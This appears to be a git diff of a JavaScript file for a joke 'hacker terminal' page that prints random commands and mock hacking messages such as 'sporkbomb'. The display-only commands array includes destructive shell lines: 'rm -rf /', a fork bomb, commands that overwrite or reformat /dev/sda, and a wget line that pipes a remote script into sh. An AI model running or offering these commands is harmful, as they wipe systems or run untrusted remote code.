@@ -1,7 +1,8 @@
 
 var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]
 var outputs = ["[Hack] Hacking into firewall...\n[Hack] firewall hacked!\n[hack] Deploying sporkbomb\n[sporkbomb] I is a big sporkbomb, Loading...\n[Hack] sporkbombed!",
-
+               "[Hack] Firewall traced to relative IP of 127.0.0.1\n[Firewall] I'm inpenatrable!\n[Hack] Damn, firewall impenatrable!\n[Nuke] I is blow up firewall!\n[Hack] Firewall down!",
+               "[Hack] Detected sporkbomb!\n[sporkbomb] I exist!\n[Hack] Cracking Firewall...\n[Hack] Cracked!"
               ]
 
 var out1;
@@ -19,7 +20,8 @@ function generateCommand() {
   $("#console-text").append(command);
   $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 500);
 
-  var output = outputs[0].split("\n");
+  var outputTarget = ranBetween(0, outputs.length);
+  var output = outputs[outputTarget].split("\n");
   for (var i = 0; i < output.length; i++) {
     $("#console-text").append("<p class='command'>"+output[i]+"</p>");
     $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 10);
